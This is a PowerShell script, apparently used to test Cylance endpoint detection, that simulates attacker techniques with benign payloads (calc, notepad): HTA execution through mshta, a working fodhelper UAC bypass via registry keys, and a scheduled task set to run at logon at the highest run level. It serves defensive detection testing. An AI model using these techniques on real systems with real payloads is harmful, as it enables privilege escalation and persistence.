# Phase 3 Cylance Simulation - Advanced Threat Behaviors
# Author: imrankhairuddin

function Test-Section {
    param($title, $command)
    Write-Host "`n=== $title ===" -ForegroundColor Magenta
    Write-Host "Command: $command" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    try {
        Invoke-Expression $command
    } catch {
        Write-Warning "Execution failed: $_"
    }
    Start-Sleep -Seconds 5
}

# A. HTA File Execution Simulation
$htaPath = "$env:TEMP\test.hta"
@"
<html>
<script>
var sh=new ActiveXObject('WScript.Shell');
sh.Run('calc');
</script>
</html>
"@ | Out-File -Encoding ASCII $htaPath
Test-Section "HTA Execution (LOLBIN)" "Start-Process mshta.exe $htaPath"

# B. Reflective PE Loader Simulation (Safe)
$dummyPE = 'Start-Process notepad'
Test-Section "Simulated Reflective PE Injection" "Invoke-Expression '$dummyPE'"

# C. Simulated UAC Bypass via Fodhelper (No effect)
Test-Section "UAC Bypass Simulation (Fodhelper)" @"
New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force |
Set-ItemProperty -Name "(default)" -Value "calc.exe"
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""
Start-Process fodhelper.exe
"@

# D. Malicious Scheduled Task (safe payload)
Test-Section "Scheduled Task Persistence (Sim)" 'schtasks /create /tn "CylanceTest" /tr "calc.exe" /sc onlogon /rl highest'

Write-Host "`n Phase 3 complete. Observe Cylance detection, blocks, logs." -ForegroundColor Green
